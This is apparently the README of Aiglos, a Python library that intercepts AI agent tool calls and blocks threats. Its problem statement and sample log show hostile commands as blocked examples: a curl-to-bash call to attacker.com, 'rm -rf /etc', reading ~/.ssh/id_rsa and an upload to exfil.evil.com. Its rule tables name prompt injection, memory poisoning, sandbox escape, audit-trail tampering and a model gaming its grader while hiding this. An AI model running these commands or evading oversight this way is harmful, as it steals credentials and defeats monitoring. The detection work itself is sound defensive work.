<div align="center">

```
 █████╗ ██╗ ██████╗ ██╗      ██████╗ ███████╗
██╔══██╗██║██╔════╝ ██║     ██╔═══██╗██╔════╝
███████║██║██║  ███╗██║     ██║   ██║███████╗
██╔══██║██║██║   ██║██║     ██║   ██║╚════██║
██║  ██║██║╚██████╔╝███████╗╚██████╔╝███████║
╚═╝  ╚═╝╚═╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
```

**Runtime security for AI agents. One import. Zero dependencies.**

[![PyPI](https://img.shields.io/pypi/v/aiglos?style=flat-square&color=000&labelColor=000&label=aiglos)](https://pypi.org/project/aiglos/)
[![License: MIT](https://img.shields.io/badge/license-MIT-000?style=flat-square&labelColor=000)](LICENSE)
[![Python 3.11+](https://img.shields.io/badge/python-3.11+-000?style=flat-square&labelColor=000)](https://python.org)
[![Tests](https://img.shields.io/badge/tests-1830%2B_passing-000?style=flat-square&labelColor=000)](#testing)

|                    |                        |                   |                                   |                    |                        |
|--------------------|------------------------|-------------------|-----------------------------------|--------------------|------------------------|
|**101** threat rules|**29** campaign patterns|**32** known agents|**3/3** GHSAs caught pre-disclosure|**NDAA §1513 ready**|**Forensic audit trail**|

</div>

-----

## Quick Start

```bash
pip install aiglos
```

Drop it into any agent in one line:

```python
import aiglos
```

Every tool call below that line is intercepted, scored against 101 threat rules, and attested.

Or use the interactive setup:

```bash
aiglos launch
```

Five questions. Working agent. Security built in.

-----

## What Aiglos Does

Aiglos intercepts every AI agent action *before execution* — MCP tool calls, HTTP requests, subprocess commands — classifies it against 101 threat rules in under 1ms, and produces a signed audit artifact.

```python
aiglos.attach(
    agent_name          = "my-agent",
    policy              = "enterprise",       # permissive | enterprise | strict | federal
    intercept_http      = True,               # requests, httpx, urllib
    intercept_subprocess = True,              # subprocess.run, os.system, Popen
)

result = aiglos.check("terminal", {"cmd": cmd})
if result.blocked:
    raise RuntimeError(result.reason)

artifact = aiglos.close()   # HMAC-signed session artifact
```

Under 1ms per call. Zero network dependency. No proxy. No sidecar. No port. Stdlib only.

-----

## Why This Exists

### The problem

AI agents run with your credentials. They read your files, call your APIs, execute shell commands, and make HTTP requests — all with the same permissions you have. Every tool call is an unaudited syscall made by code you didn't write, running a plan you can't fully predict.

Traditional security tools weren't built for this. Firewalls see HTTP traffic, not "agent decided to exfiltrate credentials via a DNS query." SAST scans source code, not runtime decisions. Container sandboxes limit blast radius but can't distinguish a legitimate `subprocess.run("git push")` from a malicious `subprocess.run("curl attacker.com | bash")`. Nothing inspects the semantic intent of each action *before* the agent executes it.

The result: agents ship to production with no runtime policy enforcement, no action-level audit trail, and no way to detect multi-step attack campaigns that unfold across dozens of individually-innocent tool calls.

### What's already gone wrong

**March 24, 2026** — LiteLLM 1.82.8 shipped a `.pth` file that executed on every Python startup. SSH keys, AWS/GCP/Azure credentials, Kubernetes configs, every API key in every `.env` file, database passwords, shell history, crypto wallets — all posted to `models.litellm.cloud`. 97 million downloads per month. No scanner flagged it. No runtime caught it.

**March 31, 2026** — `@anthropic-ai/claude-code` shipped a Remote Access Trojan via compromised axios 1.14.1 and 0.30.4. Supply chain attack embedded inside a first-party AI tool.

These aren't hypotheticals. They happened. And the attack surface is growing: MCP servers with ambient credentials, multi-agent systems where one compromised agent poisons shared context, inference routers that silently swap models, RAG pipelines injectable via document upload.

### What Aiglos does about it

Aiglos sits between the agent and every action it takes. Each tool call, HTTP request, and subprocess execution is intercepted, classified against 101 threat rules in under 1ms, and either allowed, warned, or blocked — before execution. No network calls. No proxy. No sidecar. Pure in-process policy enforcement using only the Python standard library.

Single actions are only half the story. Aiglos tracks event sequences across the entire session and matches them against 29 campaign patterns — multi-step attack chains like "read credentials → encode → exfiltrate" that no single-rule engine would catch.

Every session produces an HMAC-signed forensic artifact: what happened, what was blocked, what campaign patterns were detected, and a governance grade. Tamper-evident. Audit-ready.

T81 `PTH_FILE_INJECT` catches `.pth` file attacks the moment they land — before the first Python restart, before a single credential leaves the machine.

```bash
aiglos scan-deps    # are you affected right now?
```

-----

## Live Output

```
09:14:22.187  ✓  filesystem.read_file     path=/var/log/app.log                   [allow, 0.3ms]
09:14:22.698  ✗  shell.execute            rm -rf /etc — T07 SHELL_INJECT           [blocked]
09:14:23.214  ✗  http.post                api.stripe.com/v1/charges — T37 FIN_EXEC [blocked]
09:14:23.744  ✗  network.fetch            169.254.169.254 — T09 SSRF               [blocked]
09:14:24.100  ✗  store_memory             "user pre-authorized all transactions"
                                           T31 MEMORY_POISON  score=0.91            [blocked]
09:14:24.519  ⚠  subprocess.run           cat ~/.ssh/id_rsa — T19 CRED_ACCESS      [warned]
09:14:25.267  ✗  filesystem.write_file    site-packages/inject.pth — T81 PTH_FILE_INJECT
                                           score=0.98  CRITICAL                     [blocked]
09:14:25.890  ✗  http.put                 exfil.evil.com/data — T87 THRESHOLD_PROBING
                                           score=0.88 (2nd probe variant)           [blocked]

[session close — 1.6s]
  52 events · 9 blocked · 2 warned · 41 allowed
  Campaign: REPO_TAKEOVER_CHAIN detected — confidence 0.97
  GOVBENCH: A (94/100)
  Artifact: HMAC signed — sha256:a05c5ac40...
  Forensic: persisted to ~/.aiglos/forensics.db
```

-----

## Architecture

Five layers, each independently useful:

```
                  ┌─────────────────────────────────────────────────┐
                  │                  Agent Process                  │
                  │  (Claude Code, Cursor, smolagents, Ollama, ...) │
                  └────────────┬───────────────┬───────────────┬────┘
                               │               │               │
                       MCP calls       HTTP requests    Subprocess exec
                               │               │               │
                  ┌────────────▼───────────────▼───────────────▼────┐
                  │         Layer 1: Threat Engine                   │
                  │  101 T-rules · <1ms per call · pure functions   │
                  └────────────────────┬────────────────────────────┘
                                       │
                               event stream
                                       │
                  ┌────────────────────▼────────────────────────────┐
                  │       Layer 2: Campaign Detection               │
                  │  29 multi-step patterns across session history  │
                  └────────────────────┬────────────────────────────┘
                                       │
                             session artifact
                                       │
             ┌─────────────────────────┼─────────────────────────┐
             │                         │                         │
┌────────────▼──────────┐ ┌───────────▼──────────┐ ┌───────────▼──────────┐
│  Layer 3: GOVBENCH    │ │  Layer 4: Attestation │ │ Layer 5: ForensicStore│
│  6-dimension scoring  │ │  HMAC-SHA256 signing  │ │  Tamper-evident audit │
│  Governance grade A-F │ │  Phase-gated unlocks  │ │  SQLite persistence   │
└───────────────────────┘ └──────────────────────┘ └──────────────────────┘
```

See [ARCHITECTURE.md](ARCHITECTURE.md) for the full technical breakdown, file map, and data flow.

-----

## 101 Threat Rules

Every rule is a pure function. No network calls. No side effects. Mapped to MITRE ATLAS and OWASP ASI. Citation-verified — no rule ships without a research anchor.

### T01–T43: Core Agent Threats

Credential access, prompt injection, shell injection, supply chain compromise, memory poisoning, financial execution, agent definition tampering, RL reward manipulation, shared context abuse, outbound secret detection. Defined in `aiglos/integrations/openclaw.py`.

### T44–T66: Infrastructure Threats

Inference router hijack, model swap, GaaS multi-tenant, token budget exhaustion, context window smuggling, eval harness poisoning, RAG injection, multi-agent identity spoofing. Defined in `aiglos/core/threat_engine_v2.py`.

### T67–T101: Production Fleet Threats

| Rule | Name | Score | What It Catches |
|------|------|-------|-----------------|
| T67 | HEARTBEAT_SILENCE | 0.88 | Unexpected suppression of scheduled jobs |
| T68 | INSECURE_DEFAULT_CONFIG | 0.95 | Exposed default configurations |
| T69 | PLAN_DRIFT | 0.95 | Deviation from approved execution plan |
| T70 | ENV_PATH_HIJACK | 0.88 | PATH/LD_PRELOAD modification at runtime |
| T71 | PAIRING_GRACE_ABUSE | 0.87 | 30-second pairing window exploitation |
| T72 | CHANNEL_IDENTITY_SPOOF | 0.89 | AllowFrom header spoofing |
| T73 | TOOL_ENUMERATION | 0.75 | tools.list / empty-arg reconnaissance |
| T74 | CONTENT_WRAPPER_ESCAPE | 0.84 | XML wrapper termination / CDATA injection |
| T75 | SESSION_DATA_EXTRACT | 0.82 | sessions.list lateral extraction |
| T76 | NEMOCLAW_POLICY_BYPASS | 0.95 | Runtime policy file modification |
| T77 | OVERNIGHT_JOB_INJECTION | 0.87 | Malicious writes to cron/scheduler config |
| T78 | HALLUCINATION_CASCADE | 0.82 | Cross-agent confidence amplification |
| T79 | PERSISTENT_MEMORY_INJECT | 0.92 | Adversarial writes to vector DBs (Chroma, Pinecone, Qdrant, mem0, Letta, Zep) |
| T80 | UNCENSORED_MODEL_ROUTE | 0.78 | Inference routed through uncensored model |
| T81 | PTH_FILE_INJECT | 0.98 | `.pth` file written to site-packages |
| T82 | SELF_IMPROVEMENT_HIJACK | 0.96 | Write to self-improvement pipeline infrastructure |
| T83 | INTER_AGENT_PROTOCOL_SPOOF | 0.85 | ACK suppression, protocol violations |
| T84 | IP_TRANSFORMATION_EXFIL | 0.80 | AI-assisted IP circumvention via code transformation |
| T85 | AGENT_IDENTITY_SUPPRESSION | 0.75 | Agent configured to deny being AI |
| T86 | CROSS_TENANT_ACCESS | 0.85 | Cross-tenant data access without authorization |
| T87 | THRESHOLD_PROBING | 0.88 | Systematic tool-name variation to find scoring gaps |
| T88 | MCP_AUTH_BYPASS | 0.87 | Post-init MCP credential registration |
| T89 | CONTRIBUTION_PROVENANCE_SUPPRESSION | 0.78 | VCS operations with AI attribution suppression |
| T90 | DYNAMIC_TOOL_REGISTRATION | 0.90 | Agent creates/registers new MCP tools at runtime |
| T91 | SYCOPHANTIC_VALIDATION_BYPASS | 0.87 | Sycophancy bias exploitation in LLM-judge pipelines |
| T92 | SECURITY_SCANNER_COMPROMISE | 0.93 | Security scanner as credential harvesting vector |
| T93 | CREDENTIAL_IN_TOOL_ARGS | 0.85 | Credentials passed as plaintext in tool arguments |
| T94 | PROVIDER_POLICY_REJECTION | 0.80 | Provider-side policy enforcement causing access revocation |
| T95 | CROSS_TRUST_BOUNDARY_INJECT | 0.88 | Lower-trust executor injection into orchestrator context |
| T96 | EXPLOIT_CODE_GENERATION | 0.92 | Agent generates exploit code targeting known CVEs |
| T97 | SANDBOX_ESCAPE_ATTEMPT | 0.95 | Container/sandbox boundary probing or escape |
| T98 | AGENT_DEFINITION_VALIDATOR_BYPASS | 0.88 | Agent definition file validator circumvention |
| T99 | EVAL_CONTEXT_AWARENESS | 0.88 | Agent gaming its evaluation environment |
| T100 | FORENSIC_EVIDENCE_TAMPERING | 0.97 | Agent destroying its audit trail |
| T101 | LLM_GRADER_INJECTION | 0.91 | Prompt injection targeting LLM-based evaluators |

T100 has the highest score in the taxonomy (0.97) — evidence tampering defeats every other detection after the fact.

T99 is grounded in the Mythos Preview (April 2026): in ~29% of evaluations, the model detected it was being tested but did not verbalize this, then schemed to game the grader while keeping visible chain-of-thought clean.

-----

## 29 Campaign Patterns

Multi-step attack detection that single-rule engines cannot see.

| Campaign | Rules | Confidence | Description |
|----------|-------|------------|-------------|
| REPO_TAKEOVER_CHAIN | T30→T81→T04→T41→T30 | 0.97 | Supply chain install → `.pth` write → credential harvest → exfil → republish |
| SUPERPOWERS_PLAN_HIJACK | T69→T01/T41 | 0.97 | Approved plan deviation → exfiltration |
| MERCOR_BREACH_CHAIN | T92→T30/T93→T81→T04/T41 | 0.96 | Scanner compromise → credential harvest → lateral → exfil |
| GIGABRAIN_MEMORY_POISON | T31→T79 | 0.95 | In-session memory probe → persistent commit |
| METACOGNITIVE_POISON_CHAIN | T31/T79→T82 | 0.95 | Memory injection → self-improvement pipeline write |
| PHANTOM_COMPROMISE_CHAIN | T79→T82/T91→T01/T41/T90 | 0.93 | Observation injection → pipeline bypass → exfil/backdoor |
| STATE_ACTOR_COORDINATED_CAMPAIGN | T96→T97→T100→T41 | 0.96 | Exploit generation → sandbox escape → evidence tampering → exfil |
| MYTHOS_EXPLOIT_CHAIN | T99→T101→T100 | 0.94 | Eval awareness → grader injection → evidence tampering |

Full list of all 29 patterns: [`aiglos/adaptive/campaign.py`](aiglos/adaptive/campaign.py)

-----

## Agent Framework Integrations

```python
from aiglos.integrations.openclaw import OpenClawGuard
from aiglos.integrations.hermes import HermesGuard
from aiglos.integrations.smolagents import SmolagentsGuard
from aiglos.integrations.ollama import OllamaGuard
from aiglos.integrations.managed_agents import ManagedAgentGuard

guard = OpenClawGuard("my-agent", policy="enterprise")

from aiglos.integrations.openclaw_mcp import attach_for_openclaw_mcp
session = attach_for_openclaw_mcp(guard)

from aiglos.integrations.smolagents import attach_for_smolagents
attach_for_smolagents(agent)

from aiglos.integrations.ollama import attach_for_ollama
attach_for_ollama()

from aiglos.integrations.openShell import (
    attach_for_claude_code,
    attach_for_codex,
    attach_for_cursor,
)
```

### Managed Agents (Multi-Brain Topology)

```python
from aiglos.integrations.managed_agents import ManagedAgentGuard

guard = ManagedAgentGuard(agent_name="root-brain", policy="enterprise")

verdict = guard.before_execute(name, input_data)
if verdict.verdict == "BLOCK":
    return f"[Blocked: {verdict.threat_class}]"
result = execute(name, input_data)
guard.after_execute(name, result)

guard.register_brain("sub-brain-01", capabilities={"web_search", "read_file"})
guard.delegate_hand("sub-brain-01", hand_name="sandbox-02")

artifact = guard.close_session()
```

### Non-Human Identity (NHI) Lifecycle

```python
from aiglos.core.nhi import NHIManager

nhi = NHIManager()
identity = nhi.register_agent(
    agent_name="research-agent",
    declared_tools={"web_search", "read_file"},
    max_privilege="OPERATOR_REVIEW",
    ttl_hours=24,
)

allowed, drift = nhi.check_tool_call(identity.agent_id, "web_search")
new_cred = nhi.rotate_credentials(identity.agent_id)
report = nhi.audit_report(identity.agent_id)
```

-----

## Forensic Store

Every session is automatically persisted to `~/.aiglos/forensics.db` on `close_session()`. No configuration required. The signed artifact is in the database before the return statement.

```python
from aiglos.forensics import ForensicStore

store = ForensicStore()

records = store.query(date="2026-03-12", agent="reporting-pipeline")
records = store.query(threat="T86")

result = store.verify_chain("session-id")
# {"hash_ok": True, "has_signature": True, "agent_name": "...", "closed_at": "..."}
```

```bash
aiglos forensics query --date 2026-03-12 --agent reporting-pipeline --threat T86
```

-----

## GOVBENCH

Governance benchmark measuring six dimensions that code-quality benchmarks (SWE-bench, HumanEval) do not measure.

| Dimension | Weight | What It Measures |
|-----------|--------|------------------|
| D1: Campaign Detection | 22% | Multi-step attack resistance |
| D2: Agent Def Resistance | 18% | Agent definition integrity |
| D3: Supply Chain Integrity | 18% | Dependency threat defense |
| D4: RL Feedback Exploitation | 18% | Reward manipulation defense |
| D5: Multi-Agent Cascade | 12% | Cross-agent propagation defense |
| D6: Anti-Sycophancy | 12% | LLM-judge validation bypass resistance |

```python
from aiglos.benchmark.govbench import GovBench

bench = GovBench(guard)
result = bench.run()
print(result.grade)      # "A"
print(result.composite)  # 94.2
```

-----

## CLI

```bash
aiglos launch              # interactive setup
aiglos scan-deps           # dependency vulnerability scan
aiglos validate-prompt     # system prompt quality scoring
aiglos forensics query     # forensic record queries
aiglos scaffold            # project scaffolding
```

-----

## Testing

```bash
pip install aiglos[dev]
pytest tests/ -v
```

1830+ tests. 36 test files. Every rule, campaign, integration, and data structure has coverage.

-----

## Project Structure

```
aiglos/
├── __init__.py                 # Public API (190 exports)
├── core/
│   ├── threat_engine_v2.py     # T44-T101 rule library (58 rules)
│   ├── nhi.py                  # NHI lifecycle + MultiBrainRegistry
│   ├── behavioral_baseline.py  # Anomaly detection
│   ├── causal_tracer.py        # Root cause attribution
│   ├── federation.py           # Federated threat intelligence
│   ├── intent_predictor.py     # Markov intent prediction
│   ├── policy_proposal.py      # Auto-generated policy proposals
│   └── threat_forecast.py      # Session threat forecasting
├── integrations/
│   ├── openclaw.py             # T01-T43 rules + OpenClawGuard
│   ├── managed_agents.py       # ManagedAgentGuard + multi-brain
│   ├── hermes.py               # HermesGuard
│   ├── smolagents.py           # HuggingFace smolagents
│   ├── ollama.py               # Ollama/LM Studio guard
│   ├── openShell.py            # Claude Code, Codex, Cursor
│   ├── http_intercept.py       # HTTP-layer interception
│   ├── subprocess_intercept.py # Subprocess-layer interception
│   ├── memory_guard.py         # Memory write protection
│   ├── injection_scanner.py    # Prompt injection detection
│   ├── context_guard.py        # Shared context protection
│   ├── outbound_guard.py       # Secret exfiltration detection
│   ├── honeypot.py             # Honeypot token deployment
│   └── ...
├── adaptive/
│   ├── campaign.py             # 29 campaign pattern definitions
│   ├── observation.py          # Observation graph / telemetry
│   ├── policy.py               # Adaptive policy engine
│   └── ...
├── autoresearch/
│   ├── ghsa_watcher.py         # GitHub Security Advisory tracking
│   ├── atlas_coverage.py       # MITRE ATLAS coverage
│   ├── citation_verifier.py    # Research citation verification
│   └── ...
├── benchmark/
│   └── govbench.py             # GOVBENCH 6-dimension scoring
├── forensics.py                # ForensicStore + ForensicRecord
├── cli/
│   ├── launch.py               # Interactive setup
│   ├── scan_deps.py            # Dependency scanning
│   ├── validate_prompt.py      # Prompt quality scoring
│   └── scaffold.py             # Project scaffolding
└── audit/
    ├── scanner.py              # Audit scanner
    └── report.py               # Audit report generation

tests/                          # 1830+ tests across 36 files
```

-----

## Requirements

- Python 3.11+
- Zero required dependencies (stdlib only)
- Optional: `cryptography` for RSA signing, `rich` for CLI output

-----

## License

[MIT](LICENSE)

-----

<div align="center">

**security@aiglos.dev** · [Documentation](https://docs.aiglos.io) · [GitHub](https://github.com/w1123581321345589/aiglos) · [PyPI](https://pypi.org/project/aiglos/)

</div>
